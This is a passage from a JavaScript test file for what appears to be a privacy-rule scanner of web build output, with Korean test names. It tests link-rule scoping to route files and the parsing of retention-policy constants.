  assert.ok(c9Of(res, 'WARN').some((x) => x.file.endsWith('assets/index-abc.js')), JSON.stringify(c9Of(res)));
});

test('C9-PRIVACY: 링크 규칙은 manifest 라우트 파일만(비라우트 shell.html 은 대상 아님)', async () => {
  const res = scan(await makeRoot({ output: (o) => { o['shell.html'] = '<!doctype html><html lang="ko"><head><title>WithSmall</title></head><body><div id="root"></div></body></html>'; } }));
  expectClean(res);
  assert.deepEqual(c9Of(res), []);
});

test('C9-PRIVACY: parsePolicyConstants — 정수·곱·_ 구분만, 문자열·기타 식은 건너뜀', async () => {
  const { parsePolicyConstants } = await import('../lib/rules-output.mjs');
  const m = parsePolicyConstants(`${POLICY_TS}export const A = 1_000;\nexport const B = FOO * 2;\nexport const C = 'x';\n`);
  assert.equal(m.get('DAY_MS'), 86_400_000);
  assert.equal(m.get('UNUSED_USER_RETENTION_DAYS'), 365);
  assert.equal(m.get('MAGIC_TOKEN_RETENTION_MS'), 0);
  assert.equal(m.get('A'), 1000);
  assert.equal(m.has('B'), false);
  assert.equal(m.has('C'), false);
  assert.equal(m.has('BACKUP_DIR_ENV'), false);
});
